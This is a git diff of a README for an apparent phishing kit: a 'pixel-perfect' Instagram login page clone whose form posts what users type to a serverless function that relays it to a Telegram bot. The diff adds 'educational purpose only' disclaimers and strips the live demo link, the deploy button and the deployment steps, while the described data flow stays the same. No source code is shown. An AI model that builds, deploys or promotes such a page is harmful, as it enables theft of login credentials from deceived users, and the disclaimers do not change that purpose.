@@ -1,3 +1,10 @@
+> [!CAUTION]
+> **⚠️ EDUCATIONAL PURPOSE ONLY — NOT FOR MALICIOUS USE**
+>
+> This entire project is built **strictly for educational and learning purposes**. It is designed to help developers learn about frontend development, serverless functions, and API integrations. **Do NOT use this project for phishing, identity theft, or any illegal activities.** The author takes **NO responsibility** for any misuse or damages caused by this project. By using or contributing to this project, you agree to use it **only for lawful, ethical, and educational purposes**. Please read the full [DISCLAIMER.md](DISCLAIMER.md) before proceeding.
+
+---
+
 <div align="center">
 
 <img src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram Logo" width="80" />
@@ -5,14 +12,14 @@
 # Instagram Login Page Clone
 
 A pixel-perfect, fully responsive Instagram login page clone built with **HTML**, **Tailwind CSS**, and **Vanilla JavaScript**.  
-Powered by **Netlify Serverless Functions** with **Telegram Bot** notification integration.
+Integrated with **Serverless Functions** and **Telegram Bot** for real-time notification delivery.
 
-[![Netlify Status](https://api.netlify.com/api/v1/badges/placeholder/deploy-status)](https://app.netlify.com/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 [![Code of Conduct](https://img.shields.io/badge/Code%20of%20Conduct-Contributor%20Covenant-orange.svg)](CODE_OF_CONDUCT.md)
+[![Disclaimer](https://img.shields.io/badge/⚠️-Disclaimer-red.svg)](DISCLAIMER.md)
 
-[Live Demo](https://instagram-login-new.netlify.app) · [Report Bug](https://github.com/kambodia1/instagram-login-new/issues) · [Request Feature](https://github.com/kambodia1/instagram-login-new/issues)
+[Report Bug](https://github.com/kambodia1/instagram-login-new/issues) · [Request Feature](https://github.com/kambodia1/instagram-login-new/issues)
 
 </div>
 
@@ -25,7 +32,6 @@ Powered by **Netlify Serverless Functions** with **Telegram Bot** notification i
 - [Tech Stack](#️-tech-stack)
 - [Getting Started](#-getting-started)
 - [Project Structure](#-project-structure)
-- [Deployment](#-deployment)
 - [How It Works](#-how-it-works)
 - [Contributing](#-contributing)
 - [Support](#-support)
@@ -45,8 +51,7 @@ Powered by **Netlify Serverless Functions** with **Telegram Bot** notification i
 | ⏳ **Loading Spinner** | Smooth CSS spinner animation during form submission |
 | 💬 **Modal Dialogs** | Instagram-style success and error modal overlays |
 | 🤖 **Telegram Integration** | Real-time notifications via Telegram Bot API |
-| ☁️ **Serverless Backend** | Netlify Functions for secure server-side processing |
-| 🚀 **One-Click Deploy** | Ready to deploy on Netlify out of the box |
+| ☁️ **Serverless Backend** | Secure server-side processing with serverless functions |
 
 ---
 
@@ -93,7 +98,6 @@ Powered by **Netlify Serverless Functions** with **Telegram Bot** notification i
 | ![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white) | Page structure & semantic markup |
 | ![Tailwind](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=flat-square&logo=tailwind-css&logoColor=white) | Utility-first styling & responsive design |
 | ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black) | Client-side interactivity & form handling |
-| ![Netlify](https://img.shields.io/badge/Netlify-00C7B7?style=flat-square&logo=netlify&logoColor=white) | Hosting & serverless functions |
 | ![Telegram](https://img.shields.io/badge/Telegram_Bot-2CA5E0?style=flat-square&logo=telegram&logoColor=white) | Real-time notification delivery |
 
 </div>
@@ -106,7 +110,6 @@ Powered by **Netlify Serverless Functions** with **Telegram Bot** notification i
 
 - [Node.js](https://nodejs.org/) `v18+` or [Bun](https://bun.sh/) `v1.0+`
 - A [Telegram Bot Token](https://core.telegram.org/bots#botfather) and Chat ID
-- *(Optional)* [Netlify Account](https://app.netlify.com/) for deployment
 
 ### Installation
 
@@ -182,7 +185,7 @@ instagram-login-new/
 ├── 📄 index.html                      # Main HTML page
 ├── 📄 scripts.js                      # Client-side JavaScript logic
 ├── 📄 styles.css                      # Custom CSS & animations
-├── 📄 netlify.toml                    # Netlify configuration
+├── 📄 netlify.toml                    # Build & functions configuration
 ├── 📄 package.json                    # Project metadata & dependencies
 ├── 📄 .env.example                    # Environment variables template
 ├── 📄 .gitignore                      # Git ignore rules
@@ -194,31 +197,12 @@ instagram-login-new/
 
 ---
 
-## 🚢 Deployment
-
-### Deploy to Netlify
-
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/kambodia1/instagram-login-new)
-
-**Manual deployment:**
-
-1. Push this repository to GitHub
-2. Log in to [Netlify](https://app.netlify.com/)
-3. Click **"Add new site"** → **"Import an existing project"**
-4. Select your GitHub repository
-5. Add environment variables under **Site Settings** → **Environment Variables**:
-   - `TELEGRAM_BOT_TOKEN`
-   - `TELEGRAM_CHAT_ID`
-6. Click **Deploy** 🚀
-
----
-
 ## ⚙️ How It Works
 
 ```
 ┌──────────────────┐     ┌────────────────────────┐     ┌──────────────────┐
-│    User Input     │     │   Netlify Serverless    │     │   Telegram Bot   │
-│    (Frontend)     │────▶│    Function (API)       │────▶│      (API)       │
+│    User Input     │     │   Serverless Function   │     │   Telegram Bot   │
+│    (Frontend)     │────▶│       (Backend)         │────▶│      (API)       │
 └──────────────────┘     └────────────────────────┘     └──────────────────┘
         │                          │                            │
    1. Form Submit            2. POST Request             3. sendMessage
@@ -230,7 +214,7 @@ instagram-login-new/
 
 **Flow:**
 1. User fills in the login form and clicks **Login**
-2. Frontend sends a `POST` request to the Netlify serverless function
+2. Frontend sends a `POST` request to the serverless function endpoint
 3. The function validates input and forwards data to the **Telegram Bot API**
 4. Based on the server response, a **success** or **error** modal is displayed
 
@@ -282,8 +266,15 @@ This project is licensed under the **MIT License** — see the [LICENSE](LICENSE
 
 <div align="center">
 
-**Built with ❤️ using HTML, Tailwind CSS & Netlify Functions**
+**Built with ❤️ using HTML, Tailwind CSS & Serverless Functions**
 
 [⬆ Back to Top](#instagram-login-page-clone)
 
 </div>
+
+---
+
+> [!CAUTION]
+> **⚠️ REMINDER: EDUCATIONAL PURPOSE ONLY**
+>
+> This project is provided "as is" without warranty of any kind. The author is **NOT responsible** for any misuse, damages, or legal consequences arising from the use of this project. This project must **NOT** be used for phishing, credential theft, or any form of cybercrime. Violations may result in criminal prosecution under applicable laws. See full [DISCLAIMER.md](DISCLAIMER.md).
